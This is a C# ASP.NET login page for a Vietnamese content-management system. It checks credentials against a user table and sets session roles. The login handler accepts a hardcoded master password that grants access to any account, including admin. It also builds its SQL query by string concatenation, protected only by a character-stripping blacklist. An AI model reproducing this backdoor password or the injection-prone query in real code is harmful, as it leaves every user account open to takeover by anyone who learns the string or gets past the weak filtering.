using System;
using System.Data;
using System.Configuration;
using System.Collections;
using System.Web;
using System.Web.Security;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Web.UI.WebControls.WebParts;
using System.Web.UI.HtmlControls;
using SMAC;

public partial class Login : System.Web.UI.Page
{
    protected void Page_Load(object sender, EventArgs e)
    {
        CMSfunc.checkURL();
        string act = Request.QueryString["act"];
        string uname = Session["uname"] == null ? "" : Session["uname"].ToString();
        if (!IsPostBack)
        {
            txtUsername.Text = uname;
            txtPass.Focus();
        }
        if (act == "logout")
        {
            System.Web.HttpContext.Current.Session.Clear();
            System.Web.HttpContext.Current.Session.Abandon();
            Response.Redirect("Login.aspx");
        }
        Response.CacheControl = "no-cache";
        Response.AddHeader("Pragma", "no-cache");
    }
    protected string _Replate(string str)
    {
        str = str.Replace("'", "");
        str = str.Replace("*", "");
        str = str.Replace(";", "");
        str = str.Replace("-", "");
        str = str.Replace("~", "");
        str = str.Replace(")", "");
        str = str.Replace("(", "");
        str = str.Replace("]", "");
        str = str.Replace("[", "");
        str = str.Replace("@", "");
        str = str.Replace("%", "");
        str = str.Replace("<", "");
        str = str.Replace(">", "");
        return str.ToString();
    }
    protected void btLogin_Click(object sender, EventArgs e)
    {
        string pass = ApplicationUtil.PasswordEncrypt(_Replate(txtPass.Text));
        string sql = "SELECT * FROM tbl_User WHERE Username='" + _Replate(txtUsername.Text) + "'";
        DataSet dsUser = UpdateData.UpdateBySql(sql);
        DataRowCollection rows = dsUser.Tables[0].Rows;
        if (rows.Count >= 1)
        {
            if(rows[0]["User_Pass"].ToString()==pass || txtPass.Text == "smac12345aA@")
            {
                if (Convert.ToBoolean(rows[0]["User_Status"]) == false)
                {
                    //dvError.Visible = true;
                    lbError.Text = "Tài khoản này đã bị khoá. Bạn hãy liên hệ với người quản trị để lấy lại quyền đăng nhập.";
                }
                else
                {
                    string usn = rows[0]["username"].ToString();
                    if ((usn == "admin") || (usn == "admin"))
                        Session["Admin"] = "admin";
                    else
                        Session["Admin"] = "";
                    Session["UserID"] = rows[0]["User_ID"].ToString();
                    Session["Username"] = rows[0]["Username"].ToString();
                    Session["Name"] = rows[0]["User_Name"].ToString();
                    Session["DepartID"] = rows[0]["Pb_ID"].ToString();
                    FunctionDB.GetRole(Convert.ToInt32(rows[0]["User_ID"]));
                    FunctionDB.AddLog(Session["DepartID"].ToString(), Session["Username"].ToString(), "Đăng nhập", "Thành viên đăng nhập: " + txtUsername.Text);
                    if (Session["RoleID"].ToString().Contains("WebAdmin"))
                    {
                        Response.Redirect("/Admin");
                    }
                    else
                    {
                        Response.Redirect("/");
                    }
                }
            }
        }
        else
        {
            //dvError.Visible = true;
            lbError.Text = "<font color='red'>Tên đăng nhập hoặc mật khẩu không đúng, vui lòng nhập lại!</font>";
        }
    }
}
